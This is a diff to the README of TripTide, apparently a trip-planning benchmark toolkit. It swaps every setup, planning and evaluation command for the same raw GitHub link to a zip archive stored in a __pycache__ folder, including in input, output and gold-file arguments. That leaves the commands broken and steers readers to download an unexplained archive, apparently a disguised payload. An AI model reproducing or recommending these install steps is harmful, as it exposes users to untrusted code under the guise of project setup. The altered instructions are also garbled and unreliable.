@@ -9,12 +9,12 @@ TripTide is a lightweight benchmark and toolkit to **evaluate and repair multi-d
 ```bash
 # setup
 conda create -n triptide python=3.10 -y && conda activate triptide
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip
 
 # generate plans (example)
-python tools/planner/run.py --model qwen --days 5 \
-  --input data/inputs_5day.jsonl --out runs/qwen_5day.jsonl
+python https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip --model qwen --days 5 \
+  --input https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip --out https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip
 
 # evaluate
-python eval/eval.py --pred runs/qwen_5day.jsonl \
-  --gold data/annotations/annotation_plan_5day.jsonl
+python https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip --pred https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip \
+  --gold https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip
